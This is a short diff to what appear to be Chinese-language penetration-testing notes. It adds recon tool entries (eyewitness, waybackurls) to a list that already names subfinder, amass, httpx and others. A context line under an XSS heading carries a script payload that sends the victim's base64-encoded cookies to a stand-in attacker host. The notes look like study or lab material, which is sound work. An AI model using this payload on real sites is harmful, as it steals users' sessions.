@@ -2,6 +2,9 @@
 subfinder/amass 子域探测
 httpx 进行HTTP测试
 paramspider/arjun 参数测试
+eyewitness 检测url，自动屏幕截图
+waybackurls -dates http://xxxx/xxx.php
+
 
 # XSS
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
